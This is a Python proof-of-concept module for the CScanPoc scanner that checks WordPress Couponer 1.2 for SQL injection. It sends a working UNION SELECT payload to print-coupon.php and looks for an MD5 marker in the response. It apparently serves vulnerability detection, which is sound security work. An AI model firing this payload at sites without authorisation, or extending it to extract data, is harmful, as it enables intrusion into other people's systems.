# coding: utf-8

from CScanPoc.thirdparty import requests,hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
hh = hackhttp.hackhttp()

class Vuln(ABVuln):
    vuln_id = 'WordPress_0068' # 平台漏洞编号，留空
    name = 'WordPress Plugin Couponer 1.2 SQL 注入漏洞' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2011-08-30'  # 漏洞公布时间
    desc = '''
        WordPress Plugin Couponer 1.2 SQL 注入漏洞
    ''' # 漏洞描述
    ref = 'https://www.exploit-db.com/exploits/17759/' # 漏洞来源
    cnvd_id = '' # cnvd漏洞编号
    cve_id = '' #cve编号
    product = 'WordPress Plugin Couponer'  # 漏洞应用名称
    product_version = '1.2'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'ee0bc9f8-6b26-48b9-bfc7-ea5a6392a026'
    author = '国光'  # POC编写者
    create_date = '2018-05-15' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            url = arg
            payload = ("/wp-content/plugins/couponer/print-coupon.php?ID=-1%27%20UNION%20ALL%20SELECT%201,version(),database(),MD5(3.14),5,6,7,8,9,10--%20")
            target_url=url + payload
            code, head, body, _, _ = hh.http(target_url)
                       
            if body.find('4beed3b9c4a886067de0e3a094246f78') != -1 :
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target,name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()


if __name__ == '__main__':
    Poc().run()